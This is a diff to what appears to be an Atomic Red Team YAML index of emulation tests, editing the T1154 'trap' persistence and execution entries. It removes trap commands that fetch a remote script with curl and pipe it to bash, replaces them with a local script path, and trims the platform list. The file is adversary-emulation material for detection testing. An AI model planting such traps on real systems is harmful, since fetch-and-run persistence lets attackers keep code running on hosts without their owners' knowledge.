@@ -4914,15 +4914,13 @@ persistence:
         After sending a keyboard interrupt (CTRL+C) the script will download and execute.
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: sh
         command: |
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
+          trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" EXIT
           exit
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
+          trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" SIGINt
   T1100:
     technique:
       x_mitre_data_sources:
@@ -23296,15 +23294,13 @@ execution:
         After sending a keyboard interrupt (CTRL+C) the script will download and execute.
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: sh
         command: |
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
+          trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" EXIT
           exit
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
+          trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" SIGINt
   T1127:
     technique:
       x_mitre_data_sources:
